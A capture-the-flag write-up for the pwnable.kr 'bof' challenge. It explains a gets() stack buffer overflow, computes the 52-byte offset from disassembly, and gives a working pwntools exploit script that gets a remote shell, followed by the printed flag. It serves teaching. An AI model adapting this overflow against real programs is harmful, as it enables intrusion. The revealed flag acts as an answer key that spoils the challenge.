# pwnable.kr : bof

## Analysis

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                setregid(getegid(), getegid());
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```

### Func: main

Calls upon `func` with `0xdeadbeef` as its only parameter:

```c
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```

### Understanding

- Only calls upon the function: `func(0xdeadbeef)`.

### Func: func

Firstly, the parameter from `func` is taken in as an `int` type:

```c
void func(int key)
```

Secondly, it creates a 32 byte buffer (`overflowme`): 

```c
char overflowme[32];
```

Thirdly, prints the text `overflow me : `:

```c
printf("overflow me : ");
```


Then takes user input with `gets` (stores it in `overflowme`):

```c
gets(overflowme);       // smash me!
```

Finally, checks if `key` equals `0xcafebabe` (gives shell if valid):

```c
if(key == 0xcafebabe){
        setregid(getegid(), getegid());
        system("/bin/sh");
}
else{
        printf("Nah..\n");
}
```

### Understanding

- Takes user input with `gets`.
- Stores it in the 32 byte buffer.
- Gives shell, if the `key` is equal to `0xcafebabe`.

### Running program

The output verifies that `Nah...\n` is printed due to the key mismatch (`0xdeadbeef` ≠ `0xcafebabe`):

```c
nc pwnable.kr 10003
overflow me : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Nah..
```

### Stack review

The `overflowme` is stored in `eax` (-44 (`-0x2c`) bytes from `ebp`):

```assembly
0x00001230 <+51>:    lea    eax,[ebp-0x2c]
0x00001233 <+54>:    push   eax
0x00001234 <+55>:    call   0x1060 <gets@plt>
```

`0xdeadbeef` is stored +8 bytes from `ebp`:

```assembly
123c:       81 7d 08 be ba fe ca    cmpl   $0xcafebabe,0x8(%ebp)
```

**Validating values:**
```
0x5655623c <func+63>     cmp    dword ptr [ebp + 8], 0xcafebabe     0xdeadbeef - 0xcafebabe     EFLAGS => 0x202 [ cf pf af zf sf IF df of iopl:00 ac ]

...

> x $ebp+8
0xffffce90:     0xdeadbeef
> x $ebp-44
0xffffce5c:     0x41414141
```

**Sketch:**

```
[ebp + 8] parameter 1
[ebp + 4] return address
[ebp + 0] saved ebp
[ebp - 44] buffer[32]
```


### Calculating offsets

`overflowme` is -44 bytes from `ebp` and `0xdeadbeef` is 8 bytes. The space between is 52 bytes:

```
>>> 44 - (-8)
52
```

### Building exploit w/pwntools

> `gets` needs 56 bytes to overflow `func`'s parameter.
> The value after the 52nd byte needs to be `0xcafebabe` (in 32-bit LSB format).

First, connect to the remote server:

```python
conn = remote('pwnable.kr', 10003)
```

Then, build and send the payload after `: ` of `overflowme : ` is printed:

```python
payload = b'A' * 52 + p32(0xcafebabe)
conn.sendlineafter(b': ', payload)
```

Finally get shell, and use the command `cat flag`:

```python
conn.sendline('cat flag')
conn.interactive()
```

### Exploit script


```python
#!/bin/python3
from pwn import *

conn = remote('pwnable.kr', 10003)

payload = b'A' * 52 + p32(0xcafebabe)
conn.sendlineafter(b': ', payload)

conn.sendline('cat flag')
conn.interactive()
```

### Final Solution

```bash
[+] Opening connection to pwnable.kr on port 10003: Done
[*] Switching to interactive mode
/bin/sh: 0: can't access tty; job control turned off
$ Daddy_I_just_pwned_a_buff3r!
$ $ 
[*] Closed connection to pwnable.kr port 10003
```

**Flag:** Daddy_I_just_pwned_a_buff3r!
